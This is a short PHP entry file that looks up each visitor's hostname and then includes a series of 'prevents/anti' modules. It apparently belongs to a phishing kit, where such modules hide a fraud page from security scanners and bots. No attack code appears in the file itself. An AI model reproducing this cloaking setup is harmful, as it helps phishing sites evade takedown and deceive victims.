<?php 
include("infos.php");
$_REMOTE_HOST = gethostbyaddr($_SERVER['REMOTE_ADDR']);
include('prevents/anti1.php');
include('prevents/anti2.php');
include('prevents/anti3.php');
include('prevents/anti4.php');
include('prevents/anti6.php');
include('prevents/anti7.php');
include('prevents/anti8.php');

?>